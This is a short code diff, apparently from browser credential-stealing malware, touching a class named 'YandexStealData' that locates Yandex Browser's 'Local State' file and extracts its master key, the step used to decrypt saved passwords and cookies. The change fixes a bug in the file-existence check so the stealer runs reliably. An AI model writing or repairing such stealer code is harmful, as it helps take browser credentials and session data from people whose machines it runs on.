@@ -17,7 +17,7 @@ class YandexStealData:
         self._root_dir_ = _root_dir_
         local_state_file_path: str = os.path.join(yandex_user_data_path, "Local State")
 
-        if not os.path.join(local_state_file_path):
+        if not os.path.exists(local_state_file_path):
             return
         
         self.master_key: bytes = get_yandex_master_key(local_state_file_path)
